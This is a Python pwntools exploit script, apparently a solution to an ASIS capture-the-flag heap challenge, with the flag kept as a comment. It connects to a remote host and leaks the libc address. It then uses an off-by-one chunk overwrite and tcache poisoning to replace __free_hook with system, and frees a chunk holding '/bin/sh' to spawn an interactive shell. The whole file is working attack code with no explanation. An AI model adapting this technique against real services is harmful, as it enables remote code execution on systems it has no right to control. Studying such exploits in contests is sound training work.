from pwn import *

#ASIS{____fr3E_ho0K_0Of_by_0ne____}

#r = process('./pwn101.elf', env={'LD_PRELOAD': './libc6_2.27-3ubuntu1_amd64.so'})
r = remote('82.196.10.106', 29099)

def add(number, name, desc, desc_length):
	r.sendafter('> ', '1\n')
	r.sendafter(': ', str(desc_length) + '\n')
	r.sendafter(': ', str(number) + '\n')
	r.sendafter(': ', name)
	r.sendafter(': ', desc)	

def show(index):
	r.sendafter('> ', '2\n')
	r.sendafter(': ', str(index) + '\n')
	response = r.recvuntil('\n++++++++++++++++++++++++').split('\n++++++++++++++++++++++++')[0]
	data = {
		'number': int(response.split('Phone Number: ')[1].split('\nName        : ')[0]),
		'name': response.split('\nName        : ')[1].split('\nDescription : ')[0],
		'desc': response.split('\nDescription : ')[1],
	}
	return data

def delete(index):
	r.sendafter('> ', '3\n')
	r.sendafter(': ', str(index) + '\n')

add(0x1337, 'test', 'test', 0x2000)
add(0x1337, 'test', 'test', 0x20)
delete(0)
add(0x1337, 'test', 'A', 0x2000)
libc = u64(show(0)['desc'].ljust(8, '\x00')) - 0x3ebc41

log.success('Libc @ ' + hex(libc))

delete(1)
delete(0)

for i in range(10):
	add(0x1337, 'test', 'test', 0x20)

for i in range(10):
	delete(i)

add(0x1337, 'test', 'test', 0x10)
add(0x1337, 'test', 'test', 0xf0)
add(0x1337, 'test', 'test', 0x10)

system = libc + 0x4f440

delete(2)
delete(0)
add(0x1337, '/bin/sh\x00', 'A'*0x18 + chr(0x21), 0x18)
delete(1)
add(0x1337, 'test', 'B'*0xf8 + p64(0x21) + p64(libc + 0x3ed8e8), 0x118)
add(0x1337, 'test', 'test', 0x10)
add(0x1337, 'test', p64(system), 0x10)
delete(0)

r.interactive()
